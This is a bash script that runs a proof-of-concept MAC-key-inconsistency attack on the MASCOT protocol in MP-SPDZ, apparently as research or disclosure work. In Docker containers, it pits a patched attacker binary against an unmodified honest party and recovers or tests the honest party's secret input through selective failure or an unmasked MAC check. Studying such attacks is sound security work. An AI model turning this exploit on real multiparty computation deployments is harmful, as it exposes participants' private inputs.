#!/bin/bash
# Off-key MAC-key-inconsistency attack against MP-SPDZ MASCOT.
#
# One entry point for both circuits and both attack strengths. The honest party
# always runs a completely UNMODIFIED mascot-party.x in a separate container; only
# the attacker's binary is patched.
#
# Usage:
#   ./run-attack.sh --circuit mult|affine --attack selective|recovery \
#                   --real-y N [--guess-of-y G] [--x X]
#
#   --circuit      mult   f(x, y) = x*y; the attacker fixes x=0, so the output is
#                         always 0 and should reveal nothing about y.
#                  affine f(x; (y, r)) = x*y + r revealed only to P0, with r a
#                         uniform input of the honest party; the output hides y.
#   --attack       selective  guess y; the protocol completes iff the guess is
#                             correct, leaking one bit (works against any MAC check).
#                  recovery   read y outright from the unmasked MAC check, in a
#                             single run, with no guessing.
#   --real-y  N    the honest party's secret y.
#   --guess-of-y G the attacker's guess of y (required for selective; n/a otherwise).
#   --x       X    the attacker's input x (affine only; default 1; mult fixes x=0).
#
# Examples:
#   ./run-attack.sh --circuit mult   --attack selective --guess-of-y 7 --real-y 7
#   ./run-attack.sh --circuit mult   --attack recovery  --real-y 42
#   ./run-attack.sh --circuit affine --attack selective --guess-of-y 1 --real-y 1
#   ./run-attack.sh --circuit affine --attack recovery  --real-y 42 --x 1

set -eo pipefail

usage() {
  echo "Usage: ./run-attack.sh --circuit mult|affine --attack selective|recovery --real-y N [--guess-of-y G] [--x X]" >&2
}

CIRCUIT=""; ATTACK=""; REAL_Y=""; GUESS_OF_Y=""; X=""
while [ $# -gt 0 ]; do
  case "$1" in
    --circuit)     CIRCUIT="$2"; shift 2;;
    --attack)      ATTACK="$2"; shift 2;;
    --real-y)      REAL_Y="$2"; shift 2;;
    --guess-of-y)  GUESS_OF_Y="$2"; shift 2;;
    --x)           X="$2"; shift 2;;
    -h|--help)     grep '^#' "$0" | cut -c3-; exit 0;;
    *) echo "error: unknown option '$1'" >&2; usage; exit 2;;
  esac
done

case "$CIRCUIT" in mult|affine) ;; *) echo "error: --circuit must be 'mult' or 'affine'" >&2; usage; exit 2;; esac
case "$ATTACK"  in selective|recovery) ;; *) echo "error: --attack must be 'selective' or 'recovery'" >&2; usage; exit 2;; esac
[ -n "$REAL_Y" ] || { echo "error: --real-y is required" >&2; usage; exit 2; }
if [ "$ATTACK" = selective ] && [ -z "$GUESS_OF_Y" ]; then
  echo "error: --guess-of-y is required for --attack selective" >&2; exit 2
fi
if [ "$ATTACK" = recovery ] && [ -n "$GUESS_OF_Y" ]; then
  echo "note: --guess-of-y is ignored for --attack recovery" >&2
fi
if [ "$CIRCUIT" = mult ] && [ -n "$X" ]; then
  echo "note: --x is ignored for --circuit mult (the attacker fixes x=0)" >&2
fi

# Derived settings.
if [ "$CIRCUIT" = mult ]; then PROG=simple_threaded_mul; else PROG=affine_eval; fi
GUESS=0                         # recovery: no guess added to the MAC
[ "$ATTACK" = selective ] && GUESS="$GUESS_OF_Y"
X=${X:-1}                       # attacker's affine input (ignored for mult)

cd "$(dirname "$0")"

echo "=== Off-Key Attack on MP-SPDZ MASCOT ==="
echo "Circuit: $CIRCUIT    Attack: $ATTACK"
echo "Honest party's real y: $REAL_Y"
if [ "$ATTACK" = selective ]; then echo "Attacker's guess of y: $GUESS_OF_Y"; fi
if [ "$CIRCUIT" = affine ]; then echo "Attacker's input x:    $X   (P0's output x*y+r is uniform, so it hides y)"; fi
echo ""

NETWORK=attack-net
PORT=14000

cleanup() {
  docker rm -f attacker honest 2>/dev/null || true
  docker network rm $NETWORK 2>/dev/null || true
}
trap cleanup EXIT
cleanup

docker network create $NETWORK >/dev/null

echo "--- Step 1: Start containers (same clean base image) ---"
docker run -d --name attacker --network $NETWORK mpspdz:built sleep infinity >/dev/null
docker run -d --name honest   --network $NETWORK mpspdz:built sleep infinity >/dev/null
echo "  attacker + honest on network '$NETWORK'"

if [ "$CIRCUIT" = affine ]; then
  # r must be uniform over the WHOLE field for x*y+r to hide y for every x: a
  # small-range r would leave the possible outputs disjoint across y for a large
  # x, and the opened output would itself identify y. Sample 256 uniform bits;
  # the in-protocol reduction modulo the (128-bit) MASCOT prime makes this a
  # uniform field element (statistical distance <= 2^-128 from uniform over F_p).
  R=$(python3 -c 'import secrets; print(secrets.randbits(256))')   # honest r (hidden from P0)
  S=$(python3 -c 'import secrets; print(secrets.randbits(256))')   # P0's one-sided-output mask
fi

echo "--- Step 2: Prepare honest party (completely unmodified) ---"
docker cp $PROG.mpc honest:/usr/src/MP-SPDZ/Programs/Source/
if [ "$CIRCUIT" = mult ]; then
  docker exec honest bash -c "
    cd /usr/src/MP-SPDZ
    ./compile.py $PROG 2>&1 | tail -1
    mkdir -p Player-Data
    echo $REAL_Y > Player-Data/Input-P1-0
  "
else
  docker exec honest bash -c "
    cd /usr/src/MP-SPDZ
    ./compile.py $PROG 2>&1 | tail -1
    mkdir -p Player-Data
    # Input files are per THREAD: -0 = main thread (y), -1 = worker thread (r).
    echo $REAL_Y > Player-Data/Input-P1-0
    echo $R      > Player-Data/Input-P1-1
  "
fi
echo "  honest ready (stock mascot-party.x, no patches)"

echo "--- Step 3: Prepare attacker (patched binary) ---"
docker cp $PROG.mpc attacker:/usr/src/MP-SPDZ/Programs/Source/
docker cp patch_guess.py attacker:/usr/src/MP-SPDZ/
if [ "$CIRCUIT" = mult ]; then
  docker exec attacker bash -c "
    cd /usr/src/MP-SPDZ
    python3 patch_guess.py
    rm -f Machines/SPDZ.o Machines/mascot-party.o Protocols/*.o
    make -j4 mascot-party.x 2>&1 | tail -1
    ./compile.py $PROG 2>&1 | tail -1
    mkdir -p Player-Data
    echo 0 > Player-Data/Input-P0-0
  "
else
  docker exec attacker bash -c "
    cd /usr/src/MP-SPDZ
    python3 patch_guess.py
    rm -f Machines/SPDZ.o Machines/mascot-party.o Protocols/*.o
    make -j4 mascot-party.x 2>&1 | tail -1
    ./compile.py $PROG 2>&1 | tail -1
    mkdir -p Player-Data
    # P0 has no main-thread input; on the worker thread it supplies x then the
    # one-sided-output mask s (the 'mask known only to P0').
    : > Player-Data/Input-P0-0
    printf '%s\n%s\n' $X $S > Player-Data/Input-P0-1
  "
fi
echo "  attacker ready (patched mascot-party.x)"

echo ""
echo "--- Step 4: Run protocol ---"
docker exec -d attacker bash -c "
  cd /usr/src/MP-SPDZ
  ATTACK_MAC_KEY=1 ATTACK_GUESS=$GUESS \
    ./mascot-party.x 0 $PROG -pn $PORT -h attacker -N 2 \
    > /tmp/party0.log 2>&1
"
sleep 1
docker exec honest bash -c "
  cd /usr/src/MP-SPDZ
  ./mascot-party.x 1 $PROG -pn $PORT -h attacker -N 2 \
    > /tmp/party1.log 2>&1
" || true
sleep 2

echo "--- Attacker log ---"
docker exec attacker cat /tmp/party0.log 2>/dev/null | sed 's/^/  [attacker] /'
echo ""

echo "=== RESULT ==="
if [ "$ATTACK" = selective ]; then
  if docker exec attacker grep -q "DONE" /tmp/party0.log 2>/dev/null; then
    echo "Protocol succeeded  =>  the attacker learns  y == $GUESS_OF_Y"
  else
    echo "MAC check failure   =>  the attacker learns  y != $GUESS_OF_Y"
  fi
else
  # Recovery: the worker opens d = y - b under the off key, so exactly one opened
  # value is nonzero, and it is y.
  ALL=$(docker exec attacker cat /tmp/party0.log 2>/dev/null \
          | sed -n 's/.*ATTACK_RECOVERED opening=[0-9]* value=\([0-9]*\).*/\1/p')
  FOUND=$(printf '%s\n' "$ALL" | grep -v '^0$' | tail -1 || true)
  REC=${FOUND:-0}
  if [ -n "$ALL" ]; then
    echo "The attacker recovered the honest party's secret: y = $REC"
    if [ "$REC" = "$REAL_Y" ]; then
      echo "(matches the true secret $REAL_Y, recovered in a single run)"
    else
      echo "(true secret was $REAL_Y; recovered value differs, inspect the log above)"
    fi
  else
    echo "No ATTACK_RECOVERED line found; inspect the attacker log above."
  fi
fi
echo ""
echo "Throughout, the honest party ran a completely unmodified mascot-party.x;"
echo "the opened output reveals nothing about y (mult: x*y=0; affine: x*y+r uniform)."
